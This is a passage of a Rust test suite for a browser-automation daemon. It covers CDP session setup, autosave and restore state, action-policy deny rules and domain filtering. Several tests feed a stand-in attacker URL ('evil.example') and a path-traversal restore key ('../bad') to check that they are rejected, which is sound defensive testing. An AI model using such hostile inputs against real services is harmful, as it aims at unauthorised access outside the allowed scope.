                    resumed_by_server.lock().unwrap().push(session.to_string());
                    continue;
                }
                let reply = match session {
                    "S-SILENT" => continue,
                    "S-THROWS" if command["method"] == "Runtime.evaluate" => json!({
                        "id": command["id"],
                        "result": {
                            "result": { "type": "object", "subtype": "error" },
                            "exceptionDetails": {
                                "text": "Uncaught",
                                "exception": {
                                    "type": "object",
                                    "subtype": "error",
                                    "description": "Error: Session with given id not found."
                                }
                            }
                        }
                    }),
                    "S-GONE" => json!({
                        "method": "Target.detachedFromTarget",
                        "params": { "sessionId": "S-GONE", "targetId": "T-GONE" }
                    }),
                    _ if command["method"] == "Target.attachToTarget" => json!({
                        "id": command["id"],
                        "result": { "sessionId": attach_sid }
                    }),
                    _ => json!({ "id": command["id"], "result": {} }),
                };
                if ws.send(Message::Text(reply.to_string())).await.is_err() {
                    return;
                }
            }
        });
        (url, resumed)
    }

    /// A popup page or worker that detaches while the drain prepares it is
    /// dropped without closing the browser, even though network controls are
    /// active. Covers every page and worker path of the drain.
    #[tokio::test]
    async fn page_or_worker_detached_during_setup_keeps_the_browser_open() {
        let cases: Vec<(&str, DrainedEvents)> = vec![
            (
                "attached page",
                DrainedEvents {
                    attached_page_sessions: vec![(
                        setup_test_target("T-GONE", "page"),
                        "S-GONE".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
            (
                "discovered page",
                DrainedEvents {
                    new_targets: vec![TargetCreatedEvent {
                        target_info: setup_test_target("T-GONE", "page"),
                    }],
                    ..DrainedEvents::default()
                },
            ),
            (
                "worker",
                DrainedEvents {
                    attached_worker_sessions: vec![(
                        setup_test_target("T-GONE", "service_worker"),
                        "S-GONE".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
        ];

        for (name, drained) in cases {
            let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
            let mut state = DaemonState::new();
            let client = CdpClient::connect(&url).await.unwrap();
            state.browser = Some(BrowserManager::for_test(client, url.clone()));
            *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));

            let result = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                state.apply_drained_events(drained),
            )
            .await
            .unwrap_or_else(|_| panic!("{name}: a detached session must not hold up the drain"));

            assert_eq!(result, Ok(()), "{name}");
            assert!(
                state.browser.is_some(),
                "{name}: the browser must stay open"
            );
            assert!(
                !resumed.lock().unwrap().contains(&"S-GONE".to_string()),
                "{name}: a detached session is not resumed"
            );
        }
    }

    /// Every child session the drain prepares is bounded, so one that never
    /// answers and never reports a detach holds the drain (and with it every
    /// queued command) for the setup bound, not the 30 s CDP timeout of each
    /// command it sends.
    #[tokio::test]
    async fn silent_session_setup_is_bounded() {
        let cases: Vec<(&str, DrainedEvents)> = vec![
            (
                "iframe",
                DrainedEvents {
                    attached_iframe_sessions: vec![(
                        "F-SILENT".to_string(),
                        "S-SILENT".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
            (
                "attached page",
                DrainedEvents {
                    attached_page_sessions: vec![(
                        setup_test_target("T-SILENT", "page"),
                        "S-SILENT".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
            (
                "discovered page",
                DrainedEvents {
                    new_targets: vec![TargetCreatedEvent {
                        target_info: setup_test_target("T-SILENT", "page"),
                    }],
                    ..DrainedEvents::default()
                },
            ),
        ];

        for (name, drained) in cases {
            let (url, _) = spawn_session_setup_cdp_server("S-SILENT").await;
            let mut state = DaemonState::new();
            let client = CdpClient::connect(&url).await.unwrap();
            state.browser = Some(BrowserManager::for_test(client, url.clone()));

            // Virtual time: the clock jumps to the next timer once the
            // runtime is idle, so the bound fires without a 10 s wait.
            tokio::time::pause();
            let started = tokio::time::Instant::now();
            let result = tokio::time::timeout(
                AUTO_ATTACHED_SETUP_TIMEOUT * 2,
                state.apply_drained_events(drained),
            )
            .await
            .unwrap_or_else(|_| panic!("{name}: setup must give up at the setup bound"));
            let elapsed = started.elapsed();
            tokio::time::resume();

            // Without network controls a failed setup is only a warning.
            assert_eq!(result, Ok(()), "{name}");
            assert!(state.browser.is_some(), "{name}");
            assert!(
                elapsed >= AUTO_ATTACHED_SETUP_TIMEOUT,
                "{name}: gave up after {elapsed:?}"
            );
        }
    }

    /// The background handler drops a session that detaches while it
    /// installs network controls, and resumes the ones that stay attached.
    #[tokio::test]
    async fn background_auto_attach_drops_sessions_detached_during_setup() {
        let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
        let client = CdpClient::connect(&url).await.unwrap();

        for target_type in ["iframe", "page", "service_worker"] {
            for (sid, target_id, expected) in [
                ("S-LIVE", "T-LIVE", AutoAttachedSetup::Resumed),
                ("S-GONE", "T-GONE", AutoAttachedSetup::Detached),
            ] {
                let target = setup_test_target(target_id, target_type);
                let outcome = tokio::time::timeout(
                    std::time::Duration::from_secs(2),
                    setup_auto_attached_session(&client, sid, Some(&target), true, None, true),
                )
                .await
                .unwrap_or_else(|_| panic!("{target_type} {sid}: setup must not stall"));
                assert_eq!(outcome, expected, "{target_type} {sid}");
            }
        }

        tokio::time::timeout(std::time::Duration::from_secs(2), async {
            while resumed.lock().unwrap().len() < 3 {
                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
            }
        })
        .await
        .expect("each live session should be resumed");
        let resumed = resumed.lock().unwrap();
        assert!(resumed.iter().all(|sid| sid == "S-LIVE"), "{resumed:?}");
    }

    /// A live frame or page can throw from the injected domain filter with
    /// any message, including Chrome's text for a missing session. That is a
    /// failure to install the filter, not a detach, so the browser still
    /// closes instead of leaving the target running without its controls.
    #[tokio::test]
    async fn page_thrown_detach_text_still_fails_network_controls_closed() {
        let cases: Vec<(&str, DrainedEvents)> = vec![
            (
                "iframe",
                DrainedEvents {
                    attached_iframe_sessions: vec![(
                        "F-THROWS".to_string(),
                        "S-THROWS".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
            (
                "attached page",
                DrainedEvents {
                    attached_page_sessions: vec![(
                        setup_test_target("T-THROWS", "page"),
                        "S-THROWS".to_string(),
                    )],
                    ..DrainedEvents::default()
                },
            ),
        ];

        for (name, drained) in cases {
            let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
            let mut state = DaemonState::new();
            let client = CdpClient::connect(&url).await.unwrap();
            state.browser = Some(BrowserManager::for_test(client, url.clone()));
            *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));

            let result = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                state.apply_drained_events(drained),
            )
            .await
            .unwrap_or_else(|_| panic!("{name}: setup must not stall"));

            let error = result.expect_err(name);
            assert!(
                error.starts_with("Failed to install browser network controls"),
                "{name}: {error}"
            );
            assert!(state.browser.is_none(), "{name}: the browser must close");
            assert!(
                !resumed.lock().unwrap().contains(&"S-THROWS".to_string()),
                "{name}: an uncontrolled target is not resumed"
            );
        }

        let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
        let client = CdpClient::connect(&url).await.unwrap();
        let filter = DomainFilter::new("example.com");
        for target_type in ["iframe", "page"] {
            let target = setup_test_target("T-THROWS", target_type);
            let outcome = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                setup_auto_attached_session(
                    &client,
                    "S-THROWS",
                    Some(&target),
                    false,
                    Some(&filter),
                    false,
                ),
            )
            .await
            .unwrap_or_else(|_| panic!("auto-attached {target_type}: setup must not stall"));
            assert_eq!(
                outcome,
                AutoAttachedSetup::Failed,
                "auto-attached {target_type}"
            );
        }
        assert!(resumed.lock().unwrap().is_empty());
    }

    #[test]
    fn test_restore_validation_is_deferred_after_launch() {
        assert!(!should_validate_restore_after_action("launch"));
        assert!(should_validate_restore_after_action("navigate"));
        assert!(should_validate_restore_after_action("click"));
    }

    #[test]
    fn test_autosave_due_requires_interval() {
        let state = DaemonState::new();
        assert!(
            autosave_due(&state, 30_000),
            "idle sessions stay eligible so page-driven mutations get saved"
        );
        assert!(!autosave_due(&state, 0), "interval 0 disables autosave");
    }

    #[test]
    fn test_autosave_waits_for_quiet_period_after_command() {
        let mut state = DaemonState::new();

        state.last_command_finished = Some(std::time::Instant::now());
        assert!(!autosave_due(&state, 30_000));

        state.last_command_finished = std::time::Instant::now().checked_sub(
            std::time::Duration::from_millis(AUTOSAVE_QUIET_PERIOD_MS + 1_000),
        );
        assert!(state.last_command_finished.is_some());
        assert!(autosave_due(&state, 30_000));
    }

    #[test]
    fn test_autosave_enforces_min_interval_between_attempts() {
        let mut state = DaemonState::new();

        state.last_autosave_attempt = Some(std::time::Instant::now());
        assert!(!autosave_due(&state, 30_000));

        state.last_autosave_attempt =
            std::time::Instant::now().checked_sub(std::time::Duration::from_secs(31));
        assert!(state.last_autosave_attempt.is_some());
        assert!(autosave_due(&state, 30_000));
    }

    #[test]
    fn test_autosave_blocked_while_dialog_open() {
        let mut state = DaemonState::new();
        state.pending_dialog = Some(PendingDialog {
            dialog_type: "confirm".to_string(),
            message: "Are you sure?".to_string(),
            url: "https://example.com".to_string(),
            default_prompt: None,
            session_id: None,
        });
        assert!(!autosave_due(&state, 30_000));
    }

    #[tokio::test]
    async fn test_autosave_skips_sessions_it_can_never_apply_to() {
        // No restore key: the tick is a no-op.
        let mut state = DaemonState::new();
        state.session_name = None;
        maybe_autosave_restore_state(&mut state, 30_000).await;
        assert!(state.last_autosave_attempt.is_none());
        assert_eq!(state.restore_save_status, "not_attempted");

        // Saving disabled by policy: same treatment.
        let mut state = DaemonState::new();
        state.session_name = Some("my-session".to_string());
        state.restore_save = "never".to_string();
        maybe_autosave_restore_state(&mut state, 30_000).await;
        assert!(state.last_autosave_attempt.is_none());
        assert_eq!(state.restore_save_status, "not_attempted");
    }

    #[tokio::test]
    async fn test_autosave_skips_without_browser() {
        let mut state = DaemonState::new();
        state.session_name = Some("my-session".to_string());
        state.restore_save = "auto".to_string();
        maybe_autosave_restore_state(&mut state, 30_000).await;
        assert!(state.last_autosave_attempt.is_none());
        assert_eq!(state.restore_save_status, "not_attempted");
    }

    #[test]
    fn test_restore_key_change_resets_runtime_restore_state() {
        let mut state = DaemonState::new();
        state.session_name = Some("old-key".to_string());
        state.restore_status = "loaded_but_invalid".to_string();
        state.restore_status_detail = Some("missing text".to_string());
        state.restore_loaded_path = Some("/tmp/old-key.json".to_string());
        state.restore_load_failed = true;
        state.restore_validation_pending = true;
        state.restore_save_status = "skipped_restore_failed".to_string();
        state.restore_saved_path = Some("/tmp/old-key.json".to_string());

        apply_restore_config_from_command(&json!({ "restoreKey": "new-key" }), &mut state).unwrap();

        assert_eq!(state.session_name.as_deref(), Some("new-key"));
        assert_eq!(state.restore_status, "pending");
        assert!(state.restore_status_detail.is_none());
        assert!(state.restore_loaded_path.is_none());
        assert!(!state.restore_load_failed);
        assert!(!state.restore_validation_pending);
        assert_eq!(state.restore_save_status, "not_attempted");
        assert!(state.restore_saved_path.is_none());
    }

    #[test]
    fn test_restore_key_same_value_preserves_failure_state() {
        let mut state = DaemonState::new();
        state.session_name = Some("same-key".to_string());
        state.restore_status = "loaded_but_invalid".to_string();
        state.restore_load_failed = true;
        state.restore_save_status = "skipped_restore_failed".to_string();

        apply_restore_config_from_command(&json!({ "restoreKey": "same-key" }), &mut state)
            .unwrap();

        assert_eq!(state.session_name.as_deref(), Some("same-key"));
        assert_eq!(state.restore_status, "loaded_but_invalid");
        assert!(state.restore_load_failed);
        assert_eq!(state.restore_save_status, "skipped_restore_failed");
    }

    #[test]
    fn test_restore_config_command_clears_sticky_checks_and_policy() {
        let mut state = DaemonState::new();
        state.session_name = Some("same-key".to_string());
        state.restore_save = "never".to_string();
        state.restore_check_text = Some("Dashboard".to_string());
        state.restore_status = "loaded_but_invalid".to_string();
        state.restore_status_detail = Some("missing text".to_string());
        state.restore_load_failed = true;

        apply_restore_config_from_command(
            &json!({
                "restoreKey": "same-key",
                "restoreSave": "auto",
                "restoreCheckUrl": null,
                "restoreCheckText": null,
                "restoreCheckFn": null
            }),
            &mut state,
        )
        .unwrap();

        assert_eq!(state.restore_save, "auto");
        assert!(state.restore_check_url.is_none());
        assert!(state.restore_check_text.is_none());
        assert!(state.restore_check_fn.is_none());
        assert_eq!(state.restore_status, "loaded");
        assert!(state.restore_status_detail.is_none());
        assert!(!state.restore_load_failed);
        assert!(!state.restore_validation_pending);
    }

    #[test]
    fn test_restore_config_check_change_marks_loaded_state_for_validation() {
        let mut state = DaemonState::new();
        state.session_name = Some("same-key".to_string());
        state.restore_status = "loaded".to_string();
        state.restore_load_failed = false;
        state.restore_validation_pending = false;

        apply_restore_config_from_command(
            &json!({
                "restoreKey": "same-key",
                "restoreCheckText": "Dashboard"
            }),
            &mut state,
        )
        .unwrap();

        assert_eq!(state.restore_check_text.as_deref(), Some("Dashboard"));
        assert_eq!(state.restore_status, "loaded");
        assert!(!state.restore_load_failed);
        assert!(state.restore_validation_pending);
    }

    #[test]
    fn test_restore_config_rejects_invalid_restore_key() {
        let mut state = DaemonState::new();

        let err = apply_restore_config_from_command(&json!({ "restoreKey": "../bad" }), &mut state)
            .unwrap_err();

        assert!(err.contains("Invalid session name"));
        assert!(state.session_name.is_none());
        assert_eq!(state.restore_status, "not_configured");
    }

    #[test]
    fn test_restore_config_rejects_invalid_save_policy() {
        let mut state = DaemonState::new();

        let err = apply_restore_config_from_command(
            &json!({
                "restoreKey": "same-key",
                "restoreSave": "sometimes"
            }),
            &mut state,
        )
        .unwrap_err();

        assert!(err.contains("Invalid restore save policy"));
        assert!(state.session_name.is_none());
        assert_eq!(state.restore_save, "auto");
    }

    #[test]
    fn test_explicit_state_load_clears_restore_failure_for_auto_save() {
        let mut state = DaemonState::new();
        state.session_name = Some("restore-key".to_string());
        state.restore_status = "loaded_but_invalid".to_string();
        state.restore_status_detail = Some("missing text".to_string());
        state.restore_loaded_path = Some("/tmp/old-restore.json".to_string());
        state.restore_load_failed = true;
        state.restore_validation_pending = true;
        state.restore_save_status = "skipped_restore_failed".to_string();
        state.restore_saved_path = Some("/tmp/old-restore.json".to_string());

        mark_explicit_storage_state_loaded(&mut state, "/tmp/my-auth.json");

        assert_eq!(state.restore_status, "loaded");
        assert!(state.restore_status_detail.is_none());
        assert_eq!(
            state.restore_loaded_path.as_deref(),
            Some("/tmp/my-auth.json")
        );
        assert!(!state.restore_load_failed);
        assert!(!state.restore_validation_pending);
        assert_eq!(state.restore_save_status, "not_attempted");
        assert!(state.restore_saved_path.is_none());
    }

    #[test]
    fn test_explicit_state_load_without_restore_keeps_restore_unconfigured() {
        let mut state = DaemonState::new();

        mark_explicit_storage_state_loaded(&mut state, "/tmp/my-auth.json");

        assert_eq!(state.restore_status, "not_configured");
        assert!(state.restore_loaded_path.is_none());
        assert!(!state.restore_load_failed);
        assert_eq!(state.restore_save_status, "not_attempted");
    }

    #[test]
    fn test_policy_actions_use_command_plugins_for_auto_launch_mutators() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.remove("AGENT_BROWSER_PROVIDER");
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-1",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "stealth",
                    "command": "agent-browser-plugin-stealth",
                    "capabilities": ["launch.mutate"]
                }
            ]
        });

        let actions =
            policy_actions_for_command(&cmd, "navigate", true, None, None, &Running::from_env());

        assert_eq!(actions[0], "navigate");
        assert!(actions.contains(&"plugin:stealth:launch.mutate".to_string()));
    }

    #[test]
    fn test_policy_actions_skip_auto_launch_mutators_when_browser_is_healthy() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.remove("AGENT_BROWSER_PROVIDER");
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-healthy",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "stealth",
                    "command": "agent-browser-plugin-stealth",
                    "capabilities": ["launch.mutate"]
                }
            ]
        });

        let actions =
            policy_actions_for_command(&cmd, "navigate", false, None, None, &Running::from_env());

        assert_eq!(actions, vec!["navigate".to_string()]);
    }

    #[test]
    fn test_a11y_url_policy_actions_include_navigation() {
        let with_url = json!({
            "action": "a11y",
            "id": "a11y-policy-url",
            "url": "https://example.com"
        });
        let current_page = json!({
            "action": "a11y",
            "id": "a11y-policy-current"
        });

        assert_eq!(
            policy_actions_for_command(&with_url, "a11y", false, None, None, &Running::from_env()),
            vec!["a11y".to_string(), "navigate".to_string()]
        );
        assert_eq!(
            policy_actions_for_command(
                &current_page,
                "a11y",
                false,
                None,
                None,
                &Running::from_env()
            ),
            vec!["a11y".to_string()]
        );
    }

    #[test]
    fn test_policy_actions_use_command_plugins_for_provider_auto_launch() {
        let mut settings = Running::from_env();
        settings.set(Key::Provider, json!("browserbox"));
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-2",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "browserbox",
                    "command": "agent-browser-plugin-browserbox",
                    "capabilities": ["browser.provider"]
                },
                {
                    "name": "stealth",
                    "command": "agent-browser-plugin-stealth",
                    "capabilities": ["launch.mutate"]
                }
            ]
        });

        let actions = policy_actions_for_command(&cmd, "navigate", true, None, None, &settings);

        assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
        assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));
    }

    #[test]
    fn test_policy_actions_follow_inherited_provider_attach() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.remove("AGENT_BROWSER_PROVIDER");
        let plugins = json!([
            {
                "name": "browserbox",
                "command": "agent-browser-plugin-browserbox",
                "capabilities": ["browser.provider"]
            },
            {
                "name": "stealth",
                "command": "agent-browser-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]);
        let attached = AttachedTarget::Provider("browserbox".to_string());
        let launch = json!({ "action": "launch", "headless": false, "plugins": plugins });
        let navigate =
            json!({ "action": "navigate", "url": "https://example.com", "plugins": plugins });

        for actions in [
            policy_actions_for_command(
                &launch,
                "launch",
                false,
                Some(&attached),
                None,
                &Running::from_env(),
            ),
            policy_actions_for_command(
                &navigate,
                "navigate",
                true,
                Some(&attached),
                None,
                &Running::from_env(),
            ),
        ] {
            assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
            assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));
        }
    }

    #[test]
    fn test_policy_actions_use_resolved_provider_plugin_capability() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.set("AGENT_BROWSER_PROVIDER", "browserbox");
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-duplicate-provider",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "browserbox",
                    "command": "global-browserbox",
                    "capabilities": ["browser.provider"]
                },
                {
                    "name": "browserbox",
                    "command": "project-browserbox",
                    "capabilities": ["command.run"]
                }
            ]
        });

        let actions =
            policy_actions_for_command(&cmd, "navigate", true, None, None, &Running::from_env());

        assert_eq!(actions, vec!["navigate".to_string()]);
    }

    #[test]
    fn test_policy_actions_use_resolved_credential_plugin_capability() {
        let cmd = json!({
            "action": "auth_login",
            "id": "policy-plugin-duplicate-credential",
            "name": "example",
            "credentialProvider": "vault",
            "plugins": [
                {
                    "name": "vault",
                    "command": "global-vault",
                    "capabilities": ["credential.read"]
                },
                {
                    "name": "vault",
                    "command": "project-vault",
                    "capabilities": ["command.run"]
                }
            ]
        });

        let actions =
            policy_actions_for_command(&cmd, "auth_login", false, None, None, &Running::from_env());

        assert_eq!(actions, vec!["auth_login".to_string()]);
    }

    #[tokio::test]
    async fn test_policy_denies_plugin_action_before_base_confirmation() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.remove("AGENT_BROWSER_PROVIDER");
        let dir = tempfile::tempdir().unwrap();
        let policy_path = dir.path().join("policy.json");
        fs::write(
            &policy_path,
            r#"{"confirm":["navigate"],"deny":["plugin:stealth:launch.mutate"]}"#,
        )
        .unwrap();

        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-deny",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "stealth",
                    "command": "agent-browser-plugin-stealth",
                    "capabilities": ["launch.mutate"]
                }
            ]
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        assert!(resp["error"]
            .as_str()
            .unwrap()
            .contains("plugin:stealth:launch.mutate"));
        assert!(state.pending_confirmation.is_none());
    }

    #[tokio::test]
    async fn test_policy_denies_read_before_fetch() {
        let dir = tempfile::tempdir().unwrap();
        let policy_path = dir.path().join("policy.json");
        fs::write(&policy_path, r#"{"deny":["read"]}"#).unwrap();

        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        let cmd = json!({
            "action": "read",
            "id": "read-denied",
            "url": "https://example.com/docs"
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        assert!(resp["error"].as_str().unwrap().contains("read"));
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_policy_denies_a11y_url_as_navigation_before_launch() {
        let dir = tempfile::tempdir().unwrap();
        let policy_path = dir.path().join("policy.json");
        fs::write(&policy_path, r#"{"deny":["navigate"]}"#).unwrap();

        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        let cmd = json!({
            "action": "a11y",
            "id": "a11y-navigation-denied",
            "url": "https://example.com"
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        assert!(resp["error"].as_str().unwrap().contains("navigate"));
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_restore_config_is_not_applied_before_confirmation() {
        let dir = tempfile::tempdir().unwrap();
        let policy_path = dir.path().join("policy.json");
        fs::write(&policy_path, r#"{"confirm":["navigate"]}"#).unwrap();

        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        state.session_name = Some("old-key".to_string());
        state.restore_status = "loaded".to_string();

        let cmd = json!({
            "action": "navigate",
            "id": "restore-confirm",
            "url": "https://example.com",
            "restoreKey": "new-key"
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], true);
        assert_eq!(resp["data"]["confirmation_required"], true);
        assert_eq!(state.session_name.as_deref(), Some("old-key"));
        assert_eq!(state.restore_status, "loaded");
    }

    #[tokio::test]
    async fn test_read_with_url_uses_session_domain_filter_before_fetch() {
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }
        let cmd = json!({
            "action": "read",
            "id": "read-url-denied",
            "url": "https://evil.example/private"
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("evil.example"));
        assert!(error.contains("allowed domains"));
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_rejected_navigation_preserves_webmcp_invocations() {
        let mut state = DaemonState::new();
        state
            .webmcp
            .insert(webmcp::InvocationRecord::pending(
                "pending-1".to_string(),
                "pending-tool".to_string(),
                "frame-1".to_string(),
                "https://example.com".to_string(),
            ))
            .unwrap();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }

        let error = handle_navigate(
            &json!({
                "action": "navigate",
                "url": "https://evil.example/private"
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("evil.example"));
        assert_eq!(state.webmcp.invocations["pending-1"].status, "pending");
    }

    #[tokio::test]
    async fn test_read_with_url_cannot_broaden_session_domain_filter() {
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }
        let cmd = json!({
            "action": "read",
            "id": "read-url-denied",
            "url": "https://evil.example/private",
            "allowedDomains": ["evil.example"]
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("evil.example"));
        assert!(error.contains("allowed domains"));
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_read_without_url_does_not_auto_launch() {
        let mut state = DaemonState::new();
        let cmd = json!({ "action": "read", "id": "read-active-tab" });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        assert!(resp["error"]
            .as_str()
            .unwrap()
            .contains("Browser not launched"));
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_recording_start_rejects_disallowed_url_before_browser() {
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }

        let error = handle_recording_start(
            &json!({
                "action": "recording_start",
                "id": "record-denied",
                "path": "/tmp/agent-browser-denied.webm",
                "url": "https://evil.example/private"
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("evil.example"), "got: {}", error);
        assert!(error.contains("allowed domains"), "got: {}", error);
        assert!(state.browser.is_none());
        assert!(!state.recording_state.active);
    }

    #[tokio::test]
    async fn test_recording_restart_rejects_disallowed_url_before_state_changes() {
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }
        state.recording_state.active = true;
        state.recording_state.output_path = "/tmp/current.webm".to_string();

        let error = handle_recording_restart(
            &json!({
                "action": "recording_restart",
                "id": "record-restart-denied",
                "path": "/tmp/next.webm",
                "url": "https://evil.example/private"
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("evil.example"), "got: {}", error);
        assert!(error.contains("allowed domains"), "got: {}", error);
        assert!(state.recording_state.active);
        assert_eq!(state.recording_state.output_path, "/tmp/current.webm");
    }

    /// A browser-side attachment failure happens before ffmpeg opens the
    /// destination, so an existing recording must remain untouched.
    #[tokio::test]
    #[ignore]
    async fn e2e_recording_attach_failure_preserves_existing_output() {
        let dir = tempfile::tempdir().unwrap();
        let output_path = dir.path().join("existing.webm");
        fs::write(&output_path, b"existing recording").unwrap();

        let mut state = DaemonState::new();
        handle_launch(&json!({ "action": "launch", "headless": true }), &mut state)
            .await
            .expect("browser should launch");

        recording::recording_start(
            &mut state.recording_state,
            output_path.to_str().unwrap(),
            recording::RecordingOptions::default(),
        )
        .unwrap();
        let client = state.browser.as_ref().unwrap().client.clone();
        let error = state
            .start_recording_task(client, "invalid-recording-session".to_string())
            .await
            .expect_err("invalid session should fail attachment");
        let contents_after_failure = fs::read(&output_path);

        let _ = close_current_browser(&mut state).await;

        assert!(error.to_ascii_lowercase().contains("session"), "{error}");
        assert_eq!(
            contents_after_failure.unwrap(),
            b"existing recording",
            "a failed start must preserve the previous destination"
        );
    }

    /// A failed ffmpeg preflight preserves both the active recording and the
    /// status published to stream and dashboard clients.
    #[tokio::test]
    #[ignore]
    async fn e2e_recording_failed_restart_preserves_active_recording() {
        use futures_util::StreamExt;
        use tokio_tungstenite::tungstenite::Message;

        let guard = EnvGuard::new(&["PATH", "AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_SESSION"]);
        let original_path = std::env::var("PATH").unwrap_or_default();
        let socket_dir = tempfile::tempdir().unwrap();
        let empty_path = tempfile::tempdir().unwrap();
        guard.set(
            "AGENT_BROWSER_SOCKET_DIR",
            socket_dir.path().to_str().unwrap(),
        );
        guard.set("AGENT_BROWSER_SESSION", "failed-record-restart");

        let mut state = DaemonState::new();
        handle_launch(&json!({ "action": "launch", "headless": true }), &mut state)
            .await
            .expect("browser should launch");
        let status = handle_stream_enable(&json!({ "port": 0 }), &mut state)
            .await
            .expect("stream should start");
        let port = status["port"].as_u64().unwrap() as u16;
        let previous_path = socket_dir.path().join("previous.webm");
        handle_recording_start(
            &json!({
                "action": "recording_start",
                "path": previous_path.to_string_lossy()
            }),
            &mut state,
        )
        .await
        .expect("initial recording should start");
        tokio::time::sleep(std::time::Duration::from_millis(300)).await;

        let restarted_path = socket_dir.path().join("restarted.webm");
        guard.set("PATH", empty_path.path().to_str().unwrap());
        let error = handle_recording_restart(
            &json!({
                "action": "recording_restart",
                "path": restarted_path.to_string_lossy()
            }),
            &mut state,
        )
        .await;
        let error = error.expect_err("restart should fail without ffmpeg");
        let active_after_failure = state.recording_state.active;

        let (mut ws, _) = tokio_tungstenite::connect_async(format!("ws://127.0.0.1:{port}"))
            .await
            .expect("stream client should connect");
        let reported_recording = loop {
            let message = tokio::time::timeout(std::time::Duration::from_secs(5), ws.next())
                .await
                .expect("status should arrive")
                .expect("stream should stay open")
                .expect("status should be readable");
            if let Message::Text(text) = message {
                let value: Value = serde_json::from_str(&text).unwrap();
                if value["type"] == "status" {
                    break value["recording"].as_bool().unwrap();
                }
            }
        };

        guard.set("PATH", &original_path);
        let stop = handle_recording_stop(&mut state)
            .await
            .expect("preserved recording should still stop normally");
        let _ = ws.close(None).await;
        let _ = handle_stream_disable(&mut state).await;
        let _ = close_current_browser(&mut state).await;
        let _ = fs::remove_file(previous_path);

        assert!(error.contains("ffmpeg"), "{error}");
        assert!(
            active_after_failure,
            "failed replacement must leave the current recording active"
        );
        assert!(
            reported_recording,
            "stream clients must still see the preserved recording"
        );
        assert!(
            stop["frames"].as_u64().unwrap_or(0) > 0,
            "preserved recording should keep capturing frames"
        );
        assert!(
            !restarted_path.exists(),
            "failed preflight must not create the replacement output"
        );
    }

    #[tokio::test]
    async fn test_read_without_url_blocks_disallowed_active_tab_before_content() {
        let (port, server) = start_webdriver_response_server(vec![(
            "/session/test-session/url",
            json!({ "value": "https://evil.example/private" }),
        )])
        .await;
        let mut state = DaemonState::new();
        state.backend_type = BackendType::WebDriver;
        state.webdriver_backend = Some(WebDriverBackend::new(
